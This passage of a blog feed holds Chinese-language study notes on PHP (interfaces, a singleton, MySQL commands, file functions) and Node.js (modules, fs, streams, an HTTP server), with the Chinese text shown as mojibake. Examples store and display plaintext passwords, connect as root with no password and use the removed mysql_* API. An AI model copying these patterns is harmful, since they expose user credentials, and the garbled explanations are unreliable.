æŽ¥å£ä¸­çš„æˆå‘˜å±žæ€§ï¼Œå¿…é¡»æ˜¯å¸¸é‡ * 3. æ‰€æœ‰çš„æƒé™å¿…é¡»æ˜¯å…±æœ‰çš„ * 4. å£°æ˜ŽæŽ¥å£ä¸ä½¿ç”¨classï¼Œè€Œæ˜¯ä½¿ç”¨interface */interface Demo &#123; // æŽ¥å£ä¸­çš„æˆå‘˜å±žæ€§ï¼Œå¿…é¡»æ˜¯å¸¸é‡ const NAME = 'ABC'; // æŠ½è±¡æ–¹æ³•ä¿®é¥°ç¬¦`static`å¯ä»¥çœç•¥ function a(); function b();&#125;// å¯ä»¥ä½¿ç”¨`extends`è®©ä¸€ä¸ªæŽ¥å£ç»§æ‰¿å¦ä¸€ä¸ªæŽ¥å£interface Test extends Demo &#123; function t();&#125;class Word &#123; function w() &#123; &#125;&#125;// å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç±»æ¥å®žçŽ°æŽ¥å£ä¸­çš„å…¨éƒ¨æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ¥å®žçŽ°æŽ¥å£ä¸­çš„éƒ¨åˆ†æ–¹æ³•// ä¸€ä¸ªç±»å¯ä»¥åœ¨ç»§æ‰¿å¦ä¸€ä¸ªç±»çš„åŒæ—¶ï¼Œä½¿ç”¨`implements`å®žçŽ°ä¸€ä¸ªæŽ¥å£ï¼Œå¯ä»¥å®žçŽ°å¤šä¸ªæŽ¥å£ï¼ˆä¸€å®šè¦å…ˆç»§æ‰¿ï¼Œå†å®žçŽ°æŽ¥å£ï¼‰class Hello extends Word implements Test &#123; function a() &#123;&#125; function b() &#123;&#125; function t() &#123;&#125;&#125; å•ä¾‹æ¨¡å¼12345678910111213141516171819202122232425// å•ä¾‹æ¨¡å¼class Person &#123; static $obj = null; static function getObj() &#123; if(!self::$obj instanceof self) &#123; self::$obj = new self; &#125; /* if(is_null(self::$obj)) &#123; self::$obj = new self; &#125; */ return self::$obj; &#125; function __construct()&#123; echo 'hello...'; &#125; function __destruct() &#123; echo 'destruct...'; &#125;&#125;Person::getObj();Person::getObj();Person::getObj();Person::getObj();Person::getObj(); æ•°æ®åº“é…ç½®çŽ¯å¢ƒå˜é‡ï¼Œå¯ä»¥ç›´æŽ¥ä½¿ç”¨mysqlå‘½ä»¤ï¼šæ­¤ç”µè„‘-&gt;å±žæ€§-&gt;é«˜çº§-&gt;çŽ¯å¢ƒå˜é‡ è¿žæŽ¥è¿œç¨‹æ•°æ®åº“ -uç”¨æˆ·å -på¯†ç mysql -h localhost -uroot -p èŽ·å–userè¡¨æ ¼æ‰€æœ‰æ•°æ®select * from mysql.user create database [dbname]æ·»åŠ åº“ 12mysql&gt; create database aaa;Query OK, 1 row affected (0.00 sec) show databasesæŸ¥çœ‹æ•°æ®åº“ 1234567891011mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || test || xsphp |+--------------------+5 rows in set (0.16 sec) use [dbname]åˆ‡æ¢åˆ°æ•°æ®åº“ 12mysql&gt; use xsphpDatabase changed show tablesæŸ¥çœ‹è¡¨æ ¼ 12mysql&gt; show tables;Empty set (0.00 sec) create table [tablename]åˆ›å»ºä¸€ä¸ªè¡¨æ ¼ 12mysql&gt; create table users(id int not null auto_increment primary key);Query OK, 0 rows affected (0.64 sec) å†æŸ¥çœ‹è¡¨æ ¼åˆ—è¡¨ 1234567mysql&gt; show tables;+-----------------+| Tables_in_xsphp |+-----------------+| users |+-----------------+1 row in set (0.00 sec) desc [tablename]æŸ¥çœ‹è¡¨æ ¼è¯¦ç»†ä¿¡æ¯ 1234567mysql&gt; desc users;+-------+---------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment |+-------+---------+------+-----+---------+----------------+1 row in set (0.13 sec) alter table [tablename] add [field] [desc]æ–°å¢žå­—æ®µ 123456789101112mysql&gt; alter table users add username char(30) not null default &apos;&apos;;Query OK, 0 rows affected (0.46 sec)Enregistrements: 0 Doublons: 0 Avertissements: 0mysql&gt; desc users;+----------+----------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+----------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment || username | char(30) | NO | | | |+----------+----------+------+-----+---------+----------------+2 rows in set (0.01 sec) show create table [tablename]æŸ¥çœ‹åˆ›å»ºè¡¨æ ¼è¯­å¥ 123456mysql&gt; show create table users;| users | CREATE TABLE `users` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` char(30) NOT NULL DEFAULT &apos;&apos;, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=latin1 | å†å¢žåŠ ä¸€ä¸ªå­—æ®µ 12345678910111213mysql&gt; alter table users add password varchar(40) not null default &apos;&apos;;Query OK, 0 rows affected (0.36 sec)Enregistrements: 0 Doublons: 0 Avertissements: 0mysql&gt; desc users;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment || username | char(30) | NO | | | || password | varchar(40) | NO | | | |+----------+-------------+------+-----+---------+----------------+3 rows in set (0.01 sec) alter table [tablename] drop column [field]åˆ é™¤å­—æ®µ 123456789101112mysql&gt; alter table users drop column password;Query OK, 0 rows affected (0.34 sec)Enregistrements: 0 Doublons: 0 Avertissements: 0mysql&gt; desc users;+----------+----------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+----------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment || username | char(30) | NO | | | |+----------+----------+------+-----+---------+----------------+2 rows in set (0.01 sec) alter table [tablename] modify column [filed] [desc]ä¿®æ”¹ä¸€ä¸ªå­—æ®µ 123456789101112mysql&gt; alter table users modify column username char(22);Query OK, 0 rows affected (0.51 sec)Enregistrements: 0 Doublons: 0 Avertissements: 0mysql&gt; desc users;+----------+----------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+----------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment || username | char(22) | YES | | NULL | |+----------+----------+------+-----+---------+----------------+2 rows in set (0.01 sec) insert into [tablename] (key1, key2, ...) values (value1, value2, ...)æ·»åŠ æ•°æ® 12345678910mysql&gt; insert into users (username, password) values (&apos;admin&apos;, &apos;admin&apos;);Query OK, 1 row affected (0.07 sec)mysql&gt; select * from users;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | admin | admin |+----+----------+----------+1 row in set (0.00 sec) update [tablename] set [field]=value1, [field]=values2 where [conditions] ä¿®æ”¹æ•°æ® 12345678910111213mysql&gt; update users set username=&apos;www&apos;, password=&apos;123456&apos; where id=3;Query OK, 1 row affected (0.09 sec)Enregistrements correspondants: 1 ModifièŒ…s: 1 Warnings: 0mysql&gt; select * from users;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | admin | admin || 2 | boss | boss || 3 | www | 123456 |+----+----------+----------+3 rows in set (0.00 sec) delete from [tablename] where [conditions]åˆ é™¤æ•°æ® 12345678mysql&gt; select * from users;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | admin | admin || 3 | www | 123456 |+----+----------+----------+2 rows in set (0.00 sec) drop table [tablename]åˆ é™¤è¡¨ drop database [dbname]åˆ é™¤åº“ PHPæ“ä½œæ•°æ®åº“12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// è¿žæŽ¥æ•°æ®åº“ï¼ˆè¿”å›žèµ„æºï¼‰$link = @mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;&apos;);if(!$link) &#123; echo &apos;è¿žæŽ¥æ•°æ®åº“å¤±è´¥ï¼&lt;br&gt;&apos;; echo mysql_error();&#125;// è®¾ç½®æ“ä½œ// mysql_query(&apos;set names utf8&apos;); // è®¾ç½®å­—ç¬¦é›†ä¸ºutf-8// é€‰æ‹©ä¸€ä¸ªæ•°æ®åº“ä½œä¸ºé»˜è®¤çš„æ•°æ®åº“ä½¿ç”¨mysql_select_db(&apos;xsphp&apos;);// æ“ä½œæ•°æ®åº“çš„sqlè¯­å¥æ‰§è¡Œ$sql = &apos;select id, username, password from users order by id&apos;;// æ‰§è¡Œsqlè¯­å¥$result = mysql_query($sql);// å‰ä¸€ä¸ªæ“ä½œå½±å“çš„è¡Œæ•°ï¼ˆåˆ¤æ–­è¡¨æ˜¯å¦æœ‰å˜åŒ–ï¼‰// echo mysql_affected_rows().&apos;&lt;br&gt;&apos;;// echo mysql_insert_id();// ä»Žç»“æžœé›†è¿™ä¸ªèµ„æºä¸­èŽ·å–æƒ³è¦çš„ç»“æžœ// `mysql_fetch_row($result)` è½¬åŒ–æˆç´¢å¼•æ•°ç»„// `mysql_fetch_assoc($result)` è½¬åŒ–æˆå…³è”æ•°ç»„// `mysql_fetch_array($result, MYSQL_ASSOC)` è½¬åŒ–ç´¢å¼•æ•°ç»„å’Œå…³è”æ•°ç»„çš„ç»„åˆï¼Œç¬¬äºŒä¸ªå‚æ•°å¯å–å€¼ï¼šMYSQL_ASSOCï¼ˆå…³è”ï¼‰ï¼ŒMYSQL_NUMï¼ˆç´¢å¼•ï¼‰ï¼ŒMYSQL_BOTHï¼ˆé»˜è®¤ä¸¤ä¸ªéƒ½è¿”å›žï¼‰// `mysql_fetch_object($result) ` è½¬åŒ–ä¸ºå¯¹è±¡// é»˜è®¤æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€æ¡ï¼ˆå¯ä»¥ä½¿ç”¨`mysql_data_seek`æ”¹å˜è‡ªå·±å®šä¹‰çš„æŒ‡å®šä½ç½®ï¼‰// èŽ·å–ä¸€æ¡åŽï¼ŒæŒ‡é’ˆè‡ªåŠ¨ç§»åŠ¨ä¸‹ä¸€ä½ç½®ï¼Œæœ€åŽä¸€ä¸ªä½ç½®è¿”å›žfalse// mysql_data_seek($result, 1);/* print_r(mysql_fetch_row($result));echo &apos;&lt;br&gt;&apos;; */echo &apos;&lt;table border=&quot;1&quot;&gt;&apos;;echo &apos;&lt;tr&gt;&apos;;for($i = 0; $i &lt; mysql_num_fields($result); $i++) &#123; echo &apos;&lt;td&gt;&apos;.mysql_field_name($result, $i).&apos;&lt;/td&gt;&apos;;&#125;echo &apos;&lt;/tr&gt;&apos;;while ($row = mysql_fetch_assoc($result)) &#123; echo &apos;&lt;tr&gt;&apos;; echo &quot;&lt;td&gt;&#123;$row[&apos;id&apos;]&#125;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&#123;$row[&apos;username&apos;]&#125;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&#123;$row[&apos;password&apos;]&#125;&lt;/td&gt;&quot;; /* foreach ($row as $key =&gt; $value) &#123; echo &quot;&lt;td&gt;&#123;$value&#125;&lt;/td&gt;&quot;; &#125; */ echo &apos;&lt;/tr&gt;&apos;;&#125;echo &apos;&lt;/table&gt;&apos;;echo &apos;å…±æœ‰&apos;.mysql_num_rows($result).&apos;æ¡è®°å½•ï¼›&apos;.mysql_num_fields($result).&apos;ä¸ªå­—æ®µ&apos;;print_r(mysql_fetch_assoc($result));echo &apos;&lt;br&gt;&apos;;var_dump($result);// å…³é—­è¿žæŽ¥mysql_close($link); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); //è®¾ç½®ç¼–ç  /* function parseFileSize($size) &#123; if($size &gt; pow(2, 40)) &#123; $size = $size / pow(2, 40); $suffix = &apos;TB&apos;; &#125; else if($size &gt; pow(2, 30)) &#123; $size = $size / pow(2, 30); $suffix = &apos;GB&apos;; &#125; else if ($size &gt; pow(2, 20)) &#123; $size = $size / pow(2, 20); $suffix = &apos;MB&apos;; &#125; else if ($size &gt; pow(2, 10)) &#123; $size = $size / pow(2, 10); $suffix = &apos;KB&apos;; &#125; else &#123; $suffix = &apos;Types&apos;; &#125; return $size.$suffix; &#125; */ /* function getFilePro($filename) &#123; if(file_exists($filename)) &#123; // `filesize($filename)`æ–‡ä»¶å¤§å° echo parseFileSize(filesize($filename)); echo &apos;&lt;br&gt;&apos;; // `is_dir($filename)`æ˜¯å¦ç›®å½• if(is_dir($filename)) &#123; echo &apos;è¿™æ˜¯ä¸€ä¸ªç›®å½•&lt;br&gt;&apos;; &#125; // `is_file($filename)`æ˜¯å¦ä¸ºæ–‡ä»¶ if(is_file($filename)) &#123; echo &apos;è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶&lt;br&gt;&apos;; &#125; // `is_readable($filename)`æ˜¯å¦å¯è¯» if(is_readable($filename)) &#123; echo &apos;æ–‡ä»¶å¯è¯»&lt;br&gt;&apos;; &#125; // `is_writeable($filename)`æ˜¯å¦å¯å†™ if(is_writable($filename)) &#123; echo &apos;æ–‡ä»¶å¯å†™&lt;br&gt;&apos;; &#125; // `is_excutable($filename)`æ˜¯å¦å¯æ‰§è¡Œ if(is_executable($filename)) &#123; echo &apos;æ–‡ä»¶å¯æ‰§è¡Œ&lt;br&gt;&apos;; &#125; // åˆ›å»ºæ—¶é—´ echo &apos;åˆ›å»ºæ—¶é—´ï¼š&apos;.date(&apos;y-m-d h:m:s&apos;, filectime($filename)).&apos;&lt;br&gt;&apos;; // è®¿é—®æ—¶é—´ echo &apos;è®¿é—®æ—¶é—´ï¼š&apos;.date(&apos;y-m-d h:m:s&apos;, fileatime($filename)).&apos;&lt;br&gt;&apos;; // ä¿®æ”¹æ—¶é—´ echo &apos;ä¿®æ”¹æ—¶é—´ï¼š&apos;.date(&apos;y-m-d h:m:s&apos;, filemtime($filename)).&apos;&lt;br&gt;&apos;; &#125; else &#123; echo &apos;æ–‡ä»¶ä¸å­˜åœ¨ï¼&lt;br&gt;&apos;; &#125; &#125; getFilePro(&apos;./test.txt&apos;); */ /* function getFileType($filename) &#123; if(!file_exists($filename)) &#123; echo &apos;æ–‡ä»¶ä¸å­˜åœ¨ï¼&apos;; return false; &#125; // `filetype()`è¿”å›žæ–‡ä»¶ç±»åž‹ // æ–‡ä»¶ç±»åž‹ fifo, char, dir, block, link, file switch (filetype($filename)) &#123; case &apos;dir&apos;: echo &apos;è¿™æ˜¯ä¸€ä¸ªç›®å½•&lt;br&gt;&apos;; break; case &apos;char&apos;: echo &apos;è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦è®¾ç½®&lt;br&gt;&apos;; break; case &apos;block&apos;: echo &apos;è¿™æ˜¯ä¸€å—è®¾å¤‡&lt;br&gt;&apos;; break; case &apos;file&apos;: echo &apos;è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶&lt;br&gt;&apos;; break; case &apos;link&apos;: echo &apos;è¿™æ˜¯ä¸€ä¸ªé“¾æŽ¥&lt;br&gt;&apos;; break; default: break; &#125; &#125; getFileType(&apos;./test.txt&apos;); */ /* $filename = &apos;http://baidu.com/search/index.php?w=666&apos;; // `basename` `dirname` `pathinfo` echo &apos;basename:&apos;.basename($filename).&apos;&lt;br&gt;&apos;; echo &apos;dirname:&apos;.dirname($filename).&apos;&lt;br&gt;&apos;; echo &apos;pathinfo:&apos;; // print_r(pathinfo($filename)); // `glob()`éåŽ†æ–‡ä»¶ foreach(glob(&apos;./php/*.dll&apos;) as $filename) &#123; echo $filename; echo &apos;&lt;br&gt;&apos;; &#125; // `opendir($path)`æ‰“å¼€ç›®å½•èµ„æº $dir = opendir(&apos;php&apos;); // `readdir($dir_handle)`è¯»å–ç›®å½• while($filename = readdir($dir)) &#123; if($filename != &apos;.&apos; &amp;&amp; $filename != &apos;..&apos;) &#123; $filename = &apos;php/&apos;.$filename; if(is_file($filename)) &#123; echo &apos;æ–‡ä»¶ï¼š&apos;.$filename.&apos;&lt;br&gt;&apos;; &#125; else &#123; echo &apos;ç›®å½•ï¼š&apos;.$filename.&apos;&lt;br&gt;&apos;; &#125; &#125; &#125; echo &apos;########################&lt;br&gt;&apos;; // `rewinddir($dir_handle)`å€’å›žç›®å½•å¥æŸ„ rewinddir($dir); while($filename = readdir($dir)) &#123; if($filename != &apos;.&apos; &amp;&amp; $filename != &apos;..&apos;) &#123; $filename = &apos;php/&apos;.$filename; if(is_file($filename)) &#123; echo &apos;æ–‡ä»¶ï¼š&apos;.$filename.&apos;&lt;br&gt;&apos;; &#125; else &#123; echo &apos;ç›®å½•ï¼š&apos;.$filename.&apos;&lt;br&gt;&apos;; &#125; &#125; &#125; // å…³é—­ç›®å½•èµ„æº closedir($dir); */ // `disk_total_space($directory)` ç£ç›˜æ€»å¤§å° $total = disk_total_space(&apos;c:&apos;); echo &apos;cç›˜æ€»å¤§å°ï¼š&apos;.($total / pow(2, 30)).&apos;&lt;br&gt;&apos;; // `disk_free_space($directory)` ç£ç›˜å‰©ä½™ç©ºé—´ $free = disk_free_space(&apos;c:&apos;); echo &apos;cç›˜å‰©ä½™å¯ç”¨ç©ºé—´ï¼š&apos;.($free / pow(2, 30)).&apos;&lt;br&gt;&apos;; $dirnum = 0; // ç›®å½•æ€»æ•° $filenum = 0; // æ–‡ä»¶æ€»æ•° $filesize = 0; // æ–‡ä»¶æ€»å¤§å° function getDirNum($file) &#123; global $dirnum; global $filenum; $dir = opendir($file); while($filename = readdir($dir)) &#123; if($filename != &apos;.&apos; &amp;&amp; $filename != &apos;..&apos;) &#123; $filename = $file.&apos;/&apos;.$filename; if(is_dir($filename)) &#123; $dirnum++; getDirNum($filename); &#125; else &#123; $filenum++; $filesize += filesize($filename); &#125; &#125; &#125; closedir($dir); &#125; $directory = &apos;php&apos;; getDirNum($directory); echo $directory.&apos;æ–‡ä»¶å¤¹ä¸‹çš„ç›®å½•æ€»ä¸ªæ•°&apos;.$dirnum; echo $directory.&apos;æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶æ€»ä¸ªæ•°&apos;.$filenum; echo $directory.&apos;æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶æ€»å¤§å°ï¼š&apos;.$filesize; // `touch($filename)`åˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶ // touch(&apos;demo.js&apos;); // `copy($source, $dest)`å¤åˆ¶æ–‡ä»¶ // copy(&apos;demo.js&apos;, &apos;text.js&apos;); // `rename($oldname, $newname)`ç§»åŠ¨æˆ–é‡å‘½åä¸€ä¸ªæ–‡ä»¶ // rename(&apos;demo.js&apos;, &apos;demo_rename.js&apos;); // `unlink($filename)`åˆ é™¤ä¸€ä¸ªæ–‡ä»¶ // unlink(&apos;demo.js&apos;); // `fopen($filename, $mode)`æ‰“å¼€æ–‡ä»¶ // $fp = fopen(&apos;demo.js&apos;, &apos;w&apos;); // `ftruncate($handle, $size)`å°†æ–‡ä»¶æˆªå–æŒ‡å®šé•¿åº¦ // ftruncate($fp, 100); // å¯¹æ–‡ä»¶å†…å®¹çš„æ“ä½œ // `file_get_contents($filename)`èŽ·å–æ–‡ä»¶å†…å®¹ // $content = file_get_contents(&apos;demo.js&apos;); // print_r($content); // `file_put_contents($filename, $data)`è¦†ç›–å†™å…¥å†…å®¹ // file_put_contents(&apos;demo.js&apos;, &apos;abc&apos;); // `file($filename)`è¯»å–æ–‡ä»¶å†…å®¹åˆ°æ•°ç»„ä¸­ // $fileArr = file(&apos;demo.js&apos;); // print_r($fileArr); // `readfile($filename)`è¯»å–æ–‡ä»¶å¹¶å†™å…¥åˆ°ç¼“å­˜ // readfile(&apos;http://baidu.com&apos;); // `fopen($filename, $mode)`æ‰“å¼€æ–‡ä»¶ // `$mode`æ‰“å¼€æ¨¡å¼ // råªè¯»ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ // r+è¯»å†™ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ // wåªå†™ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´å¹¶å°†æ–‡ä»¶å¤§å°æˆªä¸º0ï¼Œä¸å­˜åœ¨åˆ™åˆ›å»ºï¼Œä¹Ÿå°±æ˜¯è¦†ç›– // w+è¯»å†™ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´å¹¶å°†æ–‡ä»¶å¤§å°æˆªä¸º0ï¼Œä¸å­˜åœ¨åˆ™åˆ›å»º // aåªå†™ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å°¾ï¼Œä¸å­˜åœ¨åˆ™åˆ›å»ºï¼Œä¹Ÿå°±æ˜¯è¿½åŠ  // a+è¯»å†™ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å°¾ï¼Œä¸å­˜åœ¨åˆ™åˆ›å»º // è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶è¦åŠ ä¸Šb $fp = fopen(&apos;demo.js&apos;, &apos;r+&apos;); // `fwrite($handle, $string)`å†™å…¥å†…å®¹ // fwrite($fp, &apos;bb\n&apos;); // `fgetc($handle)`èŽ·å–ä¸€ä¸ªå­—ç¬¦ // echo fgetc($fp); // feof($handle)æ–‡ä»¶å‡ºé”™æˆ–æ–‡ä»¶ç»“å°¾å˜æˆå‡ /* while (!feof($fp)) &#123; // `fgets($handle)`ä¸€æ¬¡è¯»å–ä¸€è¡Œ echo fgets($fp); &#125; */ // `fread($handle, $length)`ä¸€æ¬¡è¯»å–æ–‡ä»¶çš„é•¿åº¦ echo fread($fp, 4); echo &apos;&lt;br&gt;&apos;; // `ftell($handle)`è¯»å–æŒ‡é’ˆä½ç½® echo ftell($fp); echo &apos;&lt;br&gt;&apos;; // `fseek($handle, $offset)`ç§»åŠ¨æŒ‡é’ˆåˆ°æŒ‡å®šä½ç½® fseek($fp, 6); echo ftell($fp); echo &apos;&lt;br&gt;&apos;; // `rewind($handle)`æ–‡ä»¶æŒ‡é’ˆè®¾ç½®åˆ°æ–‡ä»¶å¼€å¤´ rewind($fp); echo ftell($fp); echo &apos;&lt;br&gt;&apos;; fclose($fp);?&gt;]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nodejså­¦ä¹ ç¬”è®°]]></title>
    <url>%2F2018%2F04%2F28%2Fnodejs-study%2F</url>
    <content type="text"><![CDATA[node å†…éƒ¨å¯¹æ¨¡å—è¾“å‡º module.exports çš„å®žçŽ°å˜é‡ module æ˜¯ Node åœ¨åŠ è½½ js æ–‡ä»¶å‰å‡†å¤‡çš„ä¸€ä¸ªå˜é‡ï¼Œå¹¶å°†å…¶ä¼ å…¥åŠ è½½å‡½æ•° 12345678910111213141516171819202122// å‡†å¤‡moduleå¯¹è±¡var module = &#123; id: 'hello', exports: &#123;&#125;&#125;var load = function (module) &#123; // è¯»å–çš„hello.jsä»£ç  function greet(name) &#123; console.log('Hello, ' + name + '!') &#125; module.exports = greet // hello.jsä»£ç ç»“æŸ return module.exports&#125;var exported = load(module)// ä¿å­˜modulesave(module, exported) é»˜è®¤æƒ…å†µä¸‹ï¼ŒNode å‡†å¤‡çš„ exports å˜é‡å’Œ module.exports å˜é‡å®žé™…ä¸Šæ˜¯åŒä¸€ä¸ªå˜é‡ï¼Œæ‰€ä»¥ä¸€ä¸‹ä¸¤ç§å†™æ³•éƒ½æ”¯æŒ 123456789101112// method 1module.exports = &#123; foo: foo, bar: bar&#125;;ormodule.exports.foo = foo;module.exports.bar = bar;// method 2exports.foo = foo;exports.bar = bar; processä¸‹ä¸€è½®äº‹ä»¶å¾ªçŽ¯ å›žè°ƒ 123process.nextTick(function() &#123; console.log(&apos;nextTick callback&apos;);&#125;); ç¨‹åºå³å°†é€€å‡º å›žè°ƒ 12345process.on(&apos;exit&apos;, function(code) &#123; console.log(&apos;about to exit with code&apos; + code);&#125;);console.log(&apos;nextTick set&apos;); readFile/readFileSync writeFile/writeFileSync statå¼‚æ­¥è¯»å–ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ 12345678fs.readFile('./hello.js', 'utf-8', function (err, data) &#123; console.log('read file start...') if (err) &#123; console.log(err) &#125; else &#123; console.log(data) &#125;&#125;) å¼‚æ­¥è¯»å–ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ 123456789101112fs.readFile('1.jpg', function (err, data) &#123; if (err) &#123; console.log(err) &#125; else &#123; // è¿”å›žä¸€ä¸ªbufferå¯¹è±¡ console.log(data) // Bufferå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸² console.log(data.toString('utf-8')) // æ–‡ä»¶å¤§å° console.log(data.length + ' bytes') &#125;&#125;) åŒæ­¥è¯»å–ä¸€ä¸ªæ–‡ä»¶ç›´æŽ¥è¿”å›žï¼Œè¯»å–é”™è¯¯ç”¨ tryâ€¦catch æ•èŽ· 12345678try &#123; var data = fs.readFileSync('./1.jpg') console.log(data)&#125; catch (err) &#123; console.log(err)&#125;console.log('readFileSync ended') å¼‚æ­¥å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œé»˜è®¤æ˜¯ä»¥ UTF-8 ç¼–ç å†™å…¥æ–‡æœ¬æ–‡ä»¶ 123456789var data = 'Hello,Node.js'// var data = fs.readFileSync('./1.jpg');fs.writeFile('output.txt', data, function (err) &#123; if (err) &#123; console.log(err) &#125; else &#123; console.log('write file finished') &#125;&#125;) åŒæ­¥å†™å…¥æ–‡æœ¬åˆ°ä¸€ä¸ªæ–‡ä»¶ 123var data = 'Hello,Node.js,I am sync data'fs.writeFileSync('output.txt', data)console.log('writeFileSync ended') èŽ·å–æ–‡ä»¶ä¿¡æ¯ 12345678910111213141516171819fs.stat('./1.jpg', function (err, stat) &#123; if (err) &#123; console.log(err) &#125; else &#123; // æ˜¯å¦æ˜¯æ–‡ä»¶ console.log('isFile:' + stat.isFile()) // æ˜¯å¦æ˜¯ç›®å½• console.log('isDirectory:' + stat.isDirectory()) if (stat.isFile()) &#123; // æ–‡ä»¶å¤§å° console.log('size:' + stat.size) // åˆ›å»ºæ—¶é—´ï¼ŒDateå¯¹è±¡ console.log('birth time:' + stat.birthtime) // ä¿®æ”¹æ—¶é—´ï¼ŒDateå¯¹è±¡ console.log('modified time:' + stat.mtime) &#125; &#125;&#125;) PS:ç»å¤§éƒ¨åˆ†éœ€è¦åœ¨æœåŠ¡å™¨è¿è¡ŒæœŸåå¤æ‰§è¡Œä¸šåŠ¡é€»è¾‘ï¼Œå¿…é¡»ä½¿ç”¨å¼‚æ­¥ä»£ç æœåŠ¡å™¨å¯åŠ¨æ—¶å¦‚æžœéœ€è¦è¯»å–é…ç½®æ–‡ä»¶ï¼Œæˆ–è€…ç»“æŸæ—¶éœ€è¦å†™å…¥åˆ°çŠ¶æ€æ–‡ä»¶æ—¶ï¼Œå¯ä»¥ä½¿ç”¨åŒæ­¥ä»£ç  createReadStream createWriteStream pipeåœ¨ node.js ä¸­ï¼Œæµä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬åªéœ€è¦å“åº”æµçš„äº‹ä»¶å°±å¯ä»¥äº†ã€‚data äº‹ä»¶è¡¨ç¤ºæµçš„æ•°æ®å·²ç»å¯ä»¥è¯»å–äº†ï¼Œend äº‹ä»¶è¡¨ç¤ºè¿™ä¸ªæµå·²ç»åˆ°æœ«å°¾äº†ï¼Œæ²¡æœ‰æ•°æ®å¯ä»¥è¯»å–äº†ï¼Œerror äº‹ä»¶è¡¨ç¤ºå‡ºé”™ã€‚ 1234567891011121314var rs = fs.createReadStream('./data.txt', 'utf-8')// dataäº‹ä»¶å¯èƒ½æœ‰å¤šæ¬¡ï¼Œæ¯æ¬¡ä¼ é€’çš„chunkæ˜¯æµçš„ä¸€éƒ¨åˆ†æ•°æ®rs.on('data', function (chunk) &#123; console.log('data event:', chunk)&#125;)rs.on('end', function (chunk) &#123; console.log('end event:')&#125;)rs.on('error', function (chunk) &#123; console.log('error event:')&#125;) ä»¥æµçš„å½¢å¼å†™å…¥æ–‡ä»¶ï¼Œåªéœ€è¦ä¸æ–­è°ƒç”¨ write()æ–¹æ³•ï¼Œæœ€åŽä»¥ end()ç»“æŸ 12345var ws = fs.createWriteStream('./data.txt')ws.write('user stream write data\n')ws.write('loading...\n')ws.write('END')ws.end() pipe()æŠŠä¸€ä¸ªæ–‡ä»¶æµå’Œå¦ä¸€ä¸ªæ–‡ä»¶æµä¸²èµ·æ¥ï¼Œè¿™æ ·æºæ–‡ä»¶çš„æ‰€æœ‰æ•°æ®å°±è‡ªåŠ¨å†™å…¥åˆ°ç›®æ ‡æ–‡ä»¶é‡Œ 1234var rs = fs.createReadStream('./data.txt')var ors = fs.createReadStream('./output.txt')var ws = fs.createWriteStream('./output.txt')rs.pipe(ws) åˆ›å»ºä¸€ä¸ªæœåŠ¡å™¨ 123456789101112131415var server = http.createServer(function (request, response) &#123; // httpè¯·æ±‚å¤´çš„methodå’Œurl console.log('header meathod:', request.method) console.log('header url:', request.url) // å°†httpå“åº”200å†™å…¥responseï¼ŒåŒæ—¶è®¾ç½®content-type response.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;) // å°†httpå“åº”çš„htmlå†…å®¹å†™å…¥response response.end('&lt;h1&gt;Hello world!&lt;/h1&gt;')&#125;)server.listen(8080)console.log('Server is running at 